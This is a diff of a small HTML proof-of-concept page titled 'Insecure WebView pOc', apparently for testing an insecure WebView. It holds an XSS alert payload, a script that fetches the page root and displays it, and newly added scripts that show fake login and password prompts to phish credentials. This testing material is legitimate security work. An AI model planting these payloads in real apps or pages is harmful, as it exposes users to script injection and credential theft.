@@ -6,7 +6,7 @@
 	<title>Insecure WebView pOc</title>
 </head>
 <body>
-	<h2>Insecure WebView @D3sp0</h2>
+	<h2>Insecure WebView by @D3sp0</h2>
 	
 </body>
 	<script>alert(/xss_poc/)</script>
@@ -14,6 +14,13 @@
 		javascript:fetch('/').then(res=>res.text()).then(data=>alert(data));
 	</script>
 	
-	<img src="https://i.ytimg.com/vi/X28Fmjm7YFw/maxresdefault.jpg"/>
+	<script>
+		   /* javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}*/
+
+		    javascript:window.prompt('Authorization:Login','Input_Login');
+		    window.prompt('Authorization:Password','Input_Password');
+	</script>
+	
+	
 	
 </html>
